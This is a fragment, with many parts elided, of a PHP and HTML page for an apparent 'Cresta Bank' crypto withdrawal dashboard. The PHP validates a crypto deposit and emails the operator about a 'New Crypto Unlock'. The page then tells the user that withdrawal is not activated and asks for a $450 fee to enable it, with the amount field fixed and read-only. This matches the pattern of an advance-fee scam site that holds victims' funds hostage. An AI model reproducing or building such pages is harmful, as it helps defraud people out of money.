...
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['deposit'])) {
    ...
    if (!in_array($crypto_name, $valid_crypto_names)) {
        $_SESSION['error'] = 'Invalid crypto name.';
        exit;
    }

    if (empty($wallet_address)) {
        $_SESSION['error'] = 'Wallet address is required.';
        exit;
    }
    ...
    try {
        ...
        $mail->Subject = "New Crypto Unlock Made";
        $mail->isHTML(true);
...
<head>
    ...
    <title>Crypto Withdrawal - Cresta Bank </title>
                    ...
                    <div class="dropdown-menu p-0 position-absolute" aria-labelledby="messageDropdown">
                            ...
                            <a class="dropdown-item">
                                <div class="">
                                    ...
                                    <div class="media">
                                        <p class="noti-text">No new messages</p>
                                    </div>
...
<div id="content" class="main-content">
                                     ...
                                     <form method="POST"  enctype="multipart/form-data">
                                        ...
                                        <div class="row">
                                            <div class="col-md-12 text-center">
                                                <button class="btn btn-primary mb-2 mr-2" id="withbtn" name="withdraw">
                                                    ...
                                                    <polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg> Withdraw </button>
    ...
    <p>Crypto withdrawal is currently not activated on this account. Would you like to enable this feature now for a fee of $450?</p>
    ...
    <div class="modal fade" id="exampleModal2" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="exampleModalLabel">Enable Crypto Withdrawal</h5>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                            </button>
                        </div>
                        ...
                        <form method="POST"  enctype="multipart/form-data">
                                        <div class="form-group mb-4 mt-4">
                                            ...
                                            <div class="input-group ">
                                                ...
                                                <input type="number" class="form-control" name="amount" placeholder="Amount"
                                                       aria-label="notification" aria-describedby="basic-addon1" value="450" readonly>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6">
